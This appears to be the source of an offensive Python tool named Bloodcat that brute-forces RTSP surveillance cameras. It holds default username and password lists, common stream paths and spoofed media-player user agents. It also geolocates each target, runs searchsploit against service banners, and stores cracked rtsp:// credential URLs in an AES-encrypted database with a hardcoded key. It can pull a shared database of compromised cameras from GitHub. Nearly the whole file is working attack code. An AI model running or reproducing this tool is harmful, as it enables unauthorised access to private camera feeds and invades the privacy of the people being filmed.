#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝
import re
import os
import sys
import time
from datetime import datetime
import random
import socket
import base64
import json
import subprocess
from lib.log_cat import LogCat
from lib.location import Location
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# from lib.calc_io import calcIO 
log = LogCat()


class CamLib():
    def __init__(self):
        self.KEY = b'S-H4CK13@M4ptnh!' 
        self.IV = b'14' + b'\x00' * 14   
        self.SEP = b'\uE000' 
        self.LOCAL_DB = './data/global.bc'
        self.LOCAL_LAN_DB = './data/lan.lc'
        self.DB = 'https://raw.githubusercontent.com/MartinxMax/db/refs/heads/main/blood_cat/global.bc'
        self.TIMEOUT=3
        self.default_user = "bloodcat"
        self.default_password = "S_H4CK13"
        self.USER = [
            "admin",
            "root",
            "system",
            "camera"
            "Dinion",
            "admin1",
            "Admin",
            "Admin1",
            "ubnt",
            "default",
            "888888",
            "666666",
            "service",
            "supervisor",
            "administrator",
            "Administrator",
            "ADMINISTRATOR",
        ]
        self.USER_AGENTS = [
            "VLC/3.0.18 LibVLC/3.0.18",
            "VLC/3.0.17 LibVLC/3.0.17",
            "VLC/3.0.16 LibVLC/3.0.16",
            "VLC/3.0.15 LibVLC/3.0.15",
            "VLC/3.0.14 LibVLC/3.0.14",
            "VLC/3.0.13 LibVLC/3.0.13",
            "VLC/3.0.12 LibVLC/3.0.12",
            "VLC/3.0.11 LibVLC/3.0.11",
            "VLC/3.0.10 LibVLC/3.0.10",
            "VLC/3.0.9 LibVLC/3.0.9",
            "VLC/3.0.8 LibVLC/3.0.8",
            "VLC/3.0.7 LibVLC/3.0.7",
            "VLC/3.0.6 LibVLC/3.0.6",
            "VLC/3.0.5 LibVLC/3.0.5",
            "VLC/3.0.4 LibVLC/3.0.4",
            "VLC/3.0.3 LibVLC/3.0.3",
            "VLC/3.0.2 LibVLC/3.0.2",
            "VLC/3.0.1 LibVLC/3.0.1",
            "VLC/3.0.0 LibVLC/3.0.0",
            "VLC/2.2.8 LibVLC/2.2.8",
            "VLC/2.2.7 LibVLC/2.2.7",
            "VLC/2.2.6 LibVLC/2.2.6",
            "VLC/2.2.5 LibVLC/2.2.5",
            "VLC/2.2.4 LibVLC/2.2.4",
            "VLC/2.2.3 LibVLC/2.2.3",
            "VLC/2.2.2 LibVLC/2.2.2",
            "VLC/2.2.1 LibVLC/2.2.1",
            "VLC/2.2.0 LibVLC/2.2.0",
            "VLC/2.1.6 LibVLC/2.1.6",
            "VLC/2.1.5 LibVLC/2.1.5",
            "VLC/2.1.4 LibVLC/2.1.4",
            "VLC/2.1.3 LibVLC/2.1.3",
            "VLC/2.1.2 LibVLC/2.1.2",
            "VLC/2.1.1 LibVLC/2.1.1",
            "VLC/2.1.0 LibVLC/2.1.0",
            "VLC/2.0.9 LibVLC/2.0.9",
            "VLC/2.0.8 LibVLC/2.0.8",
            "VLC/2.0.7 LibVLC/2.0.7",
            "VLC/2.0.6 LibVLC/2.0.6",
            "VLC/2.0.5 LibVLC/2.0.5",
            "VLC/2.0.4 LibVLC/2.0.4",
            "VLC/2.0.3 LibVLC/2.0.3",
            "VLC/2.0.2 LibVLC/2.0.2",
            "VLC/2.0.1 LibVLC/2.0.1",
            "VLC/2.0.0 LibVLC/2.0.0",
            "VLC/1.1.13 LibVLC/1.1.13",
            "VLC/1.1.12 LibVLC/1.1.12",
            "VLC/1.1.11 LibVLC/1.1.11",
            "VLC/1.1.10 LibVLC/1.1.10",
            "VLC/1.1.9 LibVLC/1.1.9",
            "VLC/1.1.8 LibVLC/1.1.8",
            "VLC/1.1.7 LibVLC/1.1.7",
            "VLC/1.1.6 LibVLC/1.1.6",
            "VLC/1.1.5 LibVLC/1.1.5",
            "VLC/1.1.4 LibVLC/1.1.4",
            "VLC/1.1.3 LibVLC/1.1.3",
            "VLC/1.1.2 LibVLC/1.1.2",
            "VLC/1.1.1 LibVLC/1.1.1",
            "VLC/1.1.0 LibVLC/1.1.0",
            "VLC/1.0.6 LibVLC/1.0.6",
            "VLC/1.0.5 LibVLC/1.0.5",
            "VLC/1.0.4 LibVLC/1.0.4",
            "VLC/1.0.3 LibVLC/1.0.3",
            "VLC/1.0.2 LibVLC/1.0.2",
            "VLC/1.0.1 LibVLC/1.0.1",
            "VLC/1.0.0 LibVLC/1.0.0",
            "Lavf/59.27.100",
            "Lavf/59.26.100",
            "Lavf/59.25.100",
            "Lavf/59.24.100",
            "Lavf/59.23.100",
            "Lavf/59.22.100",
            "Lavf/59.21.100",
            "Lavf/59.20.100",
            "Lavf/59.19.100",
            "Lavf/59.18.100",
            "Lavf/59.17.100",
            "Lavf/59.16.100",
            "Lavf/59.15.100",
            "Lavf/59.14.100",
            "Lavf/59.13.100",
            "Lavf/59.12.100",
            "Lavf/59.11.100",
            "Lavf/59.10.100",
            "Lavf/59.9.100",
            "Lavf/59.8.100",
            "Lavf/59.7.100",
            "Lavf/59.6.100",
            "Lavf/59.5.100",
            "Lavf/59.4.100",
            "Lavf/59.3.100",
            "Lavf/59.2.100",
            "Lavf/59.1.100",
            "Lavf/59.0.100",
            "Lavf/58.76.100",
            "Lavf/58.75.100",
            "Lavf/58.74.100",
            "Lavf/58.73.100",
            "Lavf/58.72.100",
            "Lavf/58.71.100",
            "Lavf/58.70.100",
            "Lavf/58.69.100",
            "Lavf/58.68.100",
            "Lavf/58.67.100",
            "Lavf/58.66.100",
            "Lavf/58.65.100",
            "Lavf/58.64.100",
            "Lavf/58.63.100",
            "Lavf/58.62.100",
            "Lavf/58.61.100",
            "Lavf/58.60.100",
            "Lavf/58.59.100",
            "Lavf/58.58.100",
            "Lavf/58.57.100",
            "Lavf/58.56.100",
            "Lavf/58.55.100",
            "Lavf/58.54.100",
            "Lavf/58.53.100",
            "Lavf/58.52.100",
            "Lavf/58.51.100",
            "Lavf/58.50.100",
            "MPV/0.35.1",
            "MPV/0.35.0",
            "MPV/0.34.1",
            "MPV/0.34.0",
            "MPV/0.33.1",
            "MPV/0.33.0",
            "MPV/0.32.0",
            "MPV/0.31.0",
            "MPV/0.30.0",
            "MPV/0.29.1",
            "MPV/0.29.0",
            "MPV/0.28.2",
            "MPV/0.28.1",
            "MPV/0.28.0",
            "MPV/0.27.2",
            "MPV/0.27.1",
            "MPV/0.27.0",
            "MPV/0.26.0",
            "MPV/0.25.0",
            "MPV/0.24.0",
            "MPV/0.23.0",
            "MPV/0.22.1",
            "MPV/0.22.0",
            "MPV/0.21.0",
            "MPV/0.20.0",
            "MPV/0.19.0",
            "MPV/0.18.1",
            "MPV/0.18.0",
            "MPV/0.17.0",
            "MPV/0.16.0",
            "MPV/0.15.0",
            "MPV/0.14.0",
            "MPV/0.13.0",
            "MPV/0.12.0",
            "MPV/0.11.0",
            "MPV/0.10.0",
            "MPV/0.9.0",
            "MPV/0.8.0",
            "MPV/0.7.0",
            "MPV/0.6.0",
            "MPV/0.5.0",
            "MPV/0.4.0",
            "MPV/0.3.0",
            "MPV/0.2.0",
            "MPV/0.1.0",
        ]

        self.PATH = [
            "/Streaming/Channels/101",
            "/live",
            "/0",
            "/1",
            "/11",
            "/12",
            "/live.sdp",
            "/Streaming/Channels/102",
            "/Streaming/Channels/1",
            "/Streaming/Channels/1601",
            "/cam/realmonitor?channel=1&subtype=0",
            "/cam/realmonitor?channel=1&subtype=1",
            "/cam/realmonitor",
            "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=onvif",
            "/axis-media/media.amp",
            "/axis-cgi/mjpg/video.cgi",
            "/axis-cgi/media.cgi",
            "/SNC/media/media.amp",
            "/stream1",
            "/stream2",
            "/videoMain",
            "/videoSub",
            "/h264",
            "/h265",
            "/ch0_0.h264",
            "/ch1_0.h264",
            "/live/ch00_0",
            "/live/ch0",
            "/live/channel1",
            "/live/channel0",
            "/ipcam.sdp",
            "/cam1/h264",
            "/video-stream",
            "/h264_stream",
            "/live_mpeg4.sdp",
            "/media/video1",
            "/media/video2",
            "/unicast/c1/s0/live",
            "/unicast/c2/s1/live",
            "/ucast/1/1",
            "/live/video/profile1",
            "/live/video/profile2",
            "/live/h264",
            "/live/mpeg4",
            "/live/h264_ulaw/VGA",
            "/live/h264_ulaw/HD720P",
            "/live/h264/HD1080",
            "/live/h264/HD1080P",
            "/mpeg4/media.amp?resolution=640x480"
        ]

        self.PASSWORD = [
            '',
            '000000', '00000000',
            '1111', '111111', '11111111', '1111111111','a1234567','xabc123x','1234qwer','k1111111','1qaz2wsX','1qaz2wsx','aa888888',
            '112233', '11223344','a12345678','JaNek123','new_year','pony6697',
            '121212','12345abc','Queenstown2000','123',
            '1234', '12345', '123456', '1234567', '12345678',
            '123456789', '1234567890', '12345678910', '123456789012',
            '123123', '123123123','powerclub',
            '12341234', '12344321', '1234512345',
            '987654321', '9876543210',
            '4321', '9999',
            '666666', '888888', '88888888',
            'admin', 'Admin123', 'ADMIN123',
            'admin123', 'Admin123456','admin123456', 'admin123456789',
            'admin000', 'admin888',
            'admin123!', 'admin@123', 'admin#123',
            'admin@123456', 'admin123!@#',
            '123456admin',
            'root', 'root123', 'root123456', 'root123456789',
            'roottoor', 'toor',
            'administrator', 'Administrator', 'ADMINISTRATOR',
            'system', 'System', 'SYSTEM',
            'password', 'Password', 'PASSWORD',
            'password123', 'password1234', 'password12345', 'password123456',
            'pass', 'passw0rd', 'Passw0rd',
            'qwerty', 'qwerty123', 'qwerty1234', 'qwerty12345',
            'qwertyui', 'qwertyuiop',
            'asdfgh', 'asdfgh123',
            'zxcvbn', 'zxcvbn123',
            '1qaz2wsx', '1q2w3e4r', '1q2w3e',
            'qwe123', 'qweasd', 'qweasd123',
            '123qweasd',
            'qaz123', 'wsx123', 'edc123',
            'camera', 'Camera', 'CAMERA',
            'security', 'Security', 'SECURITY',
            'surveillance', 'Surveillance',
            'ipcam', 'IPCam', 'IPCAM',
            'dvr', 'DVR',
            'nvr', 'NVR',
            'hik12345',
            'vizxv',
            'meinsm',
            'fliradmin',
            'ikwd',
            'jvc',
            'ubnt',
            'arlo',
            'default',
            'a123456',
            '123456a',
            '12345678a',
            '123456789a',
            '123456789!',
            '123456789abc',
            '123abc!',
            'secret'
            'fang12345',
            'null', 'NULL',
            'none', 'None', 'NONE'
        ]

    def filter_ips(self, ips):
        log.info("Filtering cameras...")
        alive = []
        def parse_ip_port(ip_str):
            if ':' in ip_str:
                ip, port = ip_str.split(':', 1)
                return ip, int(port)
            return ip_str, 554

        with ThreadPoolExecutor(max_workers=5) as pool:
            future_to_ip = {}
            for ip_str in ips:
                ip, port = parse_ip_port(ip_str)
                future = pool.submit(self.options_no_auth, ip, port)
                future_to_ip[future] = ip_str   

            for future in as_completed(future_to_ip):
                ip_str = future_to_ip[future]
                res = future.result()
                if res:
                    log.info(f"Camera detected: [\033[33m{ip_str}\033[0m]")
                    alive.append(ip_str)

        return alive


    def aes_encrypt(self,data: str) -> bytes:
        cipher = AES.new(self.KEY, AES.MODE_CBC, self.IV)
        return cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    
    def aes_decrypt(self,encrypted: bytes) -> str:
        cipher = AES.new(self.KEY, AES.MODE_CBC, self.IV)
        return unpad(cipher.decrypt(encrypted), AES.block_size).decode('utf-8') 
    
 
    def get_LocalDB_data(self,path_file:str):
        data = []
        try:
            with open(path_file, 'rb') as f:
                for l in f.read().split(self.SEP):
                    if not l:   
                        continue
                    data.append(json.loads(self.aes_decrypt(l)))
        except Exception as e:
            log.error("Failed to load local data...")
            return 
        return data

 
    def get_DB_data(self,url:str):
        data = []
        if not url:
            url = self.DB
        try:
            enc = requests.get(url,verify=False,timeout=5).content
            
            for l in enc.split(self.SEP):
                if not l:   
                        continue
                data.append(json.loads(self.aes_decrypt(l)))
        except Exception as e:
            log.error("Unable to update data, please check your network connection...")
            return False
        else:
            return data
    
    def merge_all_bc(self, src_dir="./data"):
        merged = {}

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = f"./data/{ts}.bc"

        if os.path.exists(out_file):
            os.remove(out_file)

        total_read = 0  

        for name in os.listdir(src_dir):
            if not name.endswith(".bc"):
                continue

            path = os.path.join(src_dir, name)

            records = self.get_LocalDB_data(path)
            count = len(records) if records else 0
            total_read += count

            log.info(f"Adding {path} to merge buffer... {count} records")

            if not records:
                continue

            for item in records:
                rtsp = item.get("rtsp")
                data = item.get("data")

                if not rtsp or not data:
                    continue

 
                if rtsp not in merged:
                    merged[rtsp] = data

        log.warning(
            f"Saving as new {ts}.bc  Estimated merged records: {len(merged)}"
        )

        for rtsp, data in merged.items():
            self.save_info(rtsp, data, out_file)

        log.success(f"Successfully merged and updated data to {out_file}")

    def save_info(self, rtsp_url: str, ip_data: str,path_file:str,ver=None):
        record = {
            "rtsp": rtsp_url,
            "data": ip_data
        }
        try:
            with open(path_file , 'ab') as f:
                data = json.dumps(record, ensure_ascii=False)
                bin_data = self.aes_encrypt(data)  
                f.write(bin_data+self.SEP)
        except Exception as e:
            log.error("Failed to save results, check permissions or if the file exists...")
        else:
            if ver:
                log.info(f"Results successfully appended to: [\033[33m{path_file}\033[0m]")

    def hiv(self,ip:str,port=554,password=''):
        def extract_ip(rtsp):
            match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
            return match.group(1) if match else None
        # Only public global.bc data
        data = self.get_LocalDB_data(self.LOCAL_DB)
        if not data:
            data = []
        ip_set = {extract_ip(r['rtsp']) for r in data if r.get('rtsp')}
        if ip in ip_set:
            log.warning(f"[{ip}] This IP has already been recorded...",ip)
            return 0
        path = self.PATH[0]
        auth_bloodcat = self.b64('admin', password)
        resp = self.describe_path(ip, port, path, auth_bloodcat)
        code = self.status(resp)
        if code in (200, 403):
            ip_data = self.show_location(ip)
            rtsp_url = f"rtsp://admin:{password}@{ip}:{port}{path}"
            log.success(f"Hikvision RTSP PLAY ：[\033[5m{rtsp_url}]",rtsp_url)
            self.save_info(rtsp_url,ip_data,self.LOCAL_DB,True)
        else:
            log.warning(f"Hikvision camera unreachable (likely firewall-blocked, verify via web service): [admin:{password}@{ip}:{port}]")
 


    def run(self, ip: str, port=554, password=''):

        def extract_ip(rtsp):
            match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
            return match.group(1) if match else None

 
        if password:
            self.PASSWORD = [password]
            log.info(f"Currently entering password spraying : Try Password => [{password}]", f"{password}")

        ip_data = self.show_location(ip)

        def _probe_and_auth(db_path, scope_log_msg):
            log.info(scope_log_msg)
            data = self.get_LocalDB_data(db_path)
            if not data:
                data = []

            ip_set = {extract_ip(r['rtsp']) for r in data if r.get('rtsp')}
            if ip in ip_set:
                log.warning("This IP has already been recorded...")
                return 0

 
            resp = self.options_no_auth(ip, port)
            code = self.status(resp)
            if code is None:
                log.warning("Partial fingerprint match (50%): no response from target")
            elif code == 200:
                log.info("Full fingerprint match (100%): resource accessible without authentication")
            elif code == 401:
                log.info("Full fingerprint match (100%): authentication required")
            elif code == 403:
                log.info("Full fingerprint match (100%): access explicitly forbidden")
            elif code in (404, 454):
                log.info("Full fingerprint match (100%): URI ignored")

            log.info(f"Probing paths using credentials [{self.default_user}:{self.default_password}]...", f"{self.default_user}:{self.default_password}")
            auth_bloodcat = self.b64(self.default_user, self.default_password)

            paths_with_401 = []
            paths_no_auth = []

            for path in self.PATH:
                resp = self.describe_path(ip, port, path, auth_bloodcat)
                code = self.status(resp)
                if code == 401:
                    log.info(f"Path [{path}] exists, proceeding with credential brute-force...", f"{path}")
                    paths_with_401.append(path)
                    break
                elif code == 200:
                    log.info(f"Path [{path}] exists and is accessible without authentication!", f"{path}")
                    paths_no_auth.append(path)
                    break
                elif code == 404 or code == 400:
                    log.info(f"Path [{path}] does not exist", f"{path}")
                else:
                    log.warning(f"Target returned an unexpected response: [{code}] , please try again later...", f"{code}")
                time.sleep(0.2)

            if paths_no_auth:
                rtsp_url = f"rtsp://{self.default_user}:{self.default_password}@{ip}:{port}{paths_no_auth[0]}"
                log.success(f"RTSP PLAY  ：[\033[5m{rtsp_url}]", f"{rtsp_url}")
                self.save_info(rtsp_url, ip_data, db_path, True)
                return 1

 
            if not paths_with_401:
                paths_with_401 = [self.PATH[0]]

            valid_creds = []
            target_path = paths_with_401[0]

            log.info(f"witching to path: [{target_path}], attempting to retrieve credentials...", f"{target_path}")

 
            for u in self.USER:
                for p in self.PASSWORD:
                    auth = self.b64(u, p)
                    if target_path:
                        resp = self.describe_path(ip, port, target_path, auth)
                    else:
                        resp = self.describe_root(ip, port, auth)
                    code = self.status(resp)
                    if code in (200, 403):
                        print()
                        log.info(f"Found credentials : [{u}:{p}]", f"{u}:{p}")
                       
                        rtsp_url = f"rtsp://{u}:{p}@{ip}:{port}{path}" if 'path' in locals() and path else f"rtsp://{u}:{p}@{ip}:{port}{target_path}"
                        log.success(f"RTSP PLAY ：[\033[5m{rtsp_url}]", f"{rtsp_url}")
                        self.save_info(rtsp_url, ip_data, db_path, True)
                        return 1
                    else:
                        sys.stdout.write(f"\r☕ ➣ Attempting credentials : [{u}:{p}]\x1b[K")
                        sys.stdout.flush()
                    time.sleep(0.2)
            else:
                print()
                log.warning("No valid credentials found")

            return None
 
        if 'lan' in ip_data:
            res = _probe_and_auth(self.LOCAL_LAN_DB, "Detected that the current target is located within a local network...")
            if res is not None:
                return res
        elif 'country' in ip_data:
            res = _probe_and_auth(self.LOCAL_DB, "Detected that the current target is located on the public network...")
            if res is not None:
                return res
        else:
            log.error("Failed to retrieve IP information.")
            return 0

        return 2

    
    def show_location(self,ip:str):
        def check_ip_type(ip: str) -> int:
            ipv4_pattern = re.compile(r'^((25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)$')
            private_pattern = re.compile(r'^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)')
            if not ipv4_pattern.match(ip):
                return 3  
            elif private_pattern.match(ip):
                return 2 
            else:
                return 1
        code = check_ip_type(ip)
        if code == 2:
            data = {
                'lan':ip
            }
            return data
        elif code == 1:
            location_ = Location()
            data = location_.get(ip)
            show = f'''\033[33m==========================================
IP:{ip}
Country: {data['country']}
City: {data['city']}
Lat&Lng: {data['lalo']}
ASN: {data['asn']}
ISP/Org: {data['sys_org']}
Network Range: {data['network']}
===========================================\033[0m'''
            print(show)
            location_.close()
            return data
        return False
        

    def send(self,req, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.TIMEOUT)
        try:
            s.connect((ip, port))
            s.sendall(req.encode())
            data = s.recv(8192)
            return data.decode(errors="ignore")
        except Exception:
            return None
        finally:
            s.close()

    def describe_path(self,ip, port, path, auth=None):
        hdr = ""
        if auth:
            hdr = f"Authorization: Basic {auth}\r\n"
        ua = self.random_ua()
        req = (
            f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
            f"CSeq: 3\r\n"
            f"Accept: application/sdp\r\n"
            f"User-Agent: {ua}\r\n"
            f"{hdr}\r\n"
        )

        return self.send(req, ip, port)

    def random_ua(self):
        return random.choice(self.USER_AGENTS)

    def status(self,resp):
        if not resp:
            return None
        try:
            return int(resp.splitlines()[0].split()[1])
        except Exception:
            return None

    def b64(self,user, pwd):
        return base64.b64encode(f"{user}:{pwd}".encode()).decode()
    
    def options_no_auth(self, ip, port):
 
        ua = self.random_ua()
        req = (
            f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"User-Agent: {ua}\r\n\r\n"
        )

        data = self.send(req, ip, port)
        if not isinstance(data, str):
            log.warning("No response received, please try again later...")
            return data 
        m = re.search(r'(?im)^Server:\s*([^\r\n]+)', data)
        if m:
            log.info(f"Service detected: [{m.group(1)}]",f"{m.group(1)}")
            try:
                subprocess.run(
                    ["./exploitdb/searchsploit", "-w", m.group(1)],
                    check=True
                )
            except Exception:
                log.warning(
                    "CVE lookup failed. Please run on Linux with Bloodcat installed. "
                    "Try `chmod +x ./exploitdb/searchsploit`.",
                    "chmod +x ./exploitdb/searchsploit"
                )
        return data



